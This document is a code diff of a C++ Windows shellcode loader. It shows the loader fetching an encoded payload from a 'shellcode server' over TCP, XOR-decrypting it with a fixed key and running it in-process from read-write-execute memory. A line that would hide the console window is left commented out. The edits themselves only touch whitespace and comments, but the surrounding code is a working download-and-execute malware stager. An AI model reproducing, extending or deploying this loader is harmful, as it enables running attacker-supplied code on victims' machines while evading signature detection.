@@ -16,7 +16,7 @@ void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key);
 DWORD RunShellcodeInSelf(Shellcode shellcode);
 
 int main() {
-    //::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
     Shellcode shellcode;
     std::cout << "Connecting to shellcode server..." << std::endl;
@@ -31,9 +31,7 @@ int main() {
     std::cout << "First 10 bytes before decrypt: ";
     for (int i = 0; i < 10; ++i) std::cout << std::hex << (int)shellcode.pcData[i] << " ";
     std::cout << std::endl;
-
     XorDecrypt(shellcode.pcData, shellcode.dwSize, 0xAA);
-
     std::cout << "First 10 bytes after decrypt: ";
     for (int i = 0; i < 10; ++i) std::cout << std::hex << (int)shellcode.pcData[i] << " ";
     std::cout << std::endl;
@@ -41,7 +39,6 @@ int main() {
     std::cout << "Executing shellcode in-process..." << std::endl;
     DWORD exitCode = RunShellcodeInSelf(shellcode);
     std::cout << "Shellcode thread exited with code: " << exitCode << std::endl;
-
     system("pause");
     return 0;
 }
@@ -95,7 +92,6 @@ BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode) {
 
 DWORD RunShellcodeInSelf(Shellcode shellcode) {
     std::cout << "Entered RunShellcodeInSelf" << std::endl;
-
     HANDLE hProcess = GetCurrentProcess();
     LPVOID mem = VirtualAllocEx(hProcess, nullptr, shellcode.dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!mem) {
@@ -127,6 +123,7 @@ DWORD RunShellcodeInSelf(Shellcode shellcode) {
     return exitCode;
 }
 
+// decode the encoded shellcode file
 void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key) {
     for (DWORD i = 0; i < dataLen; ++i) {
         data[i] ^= key;
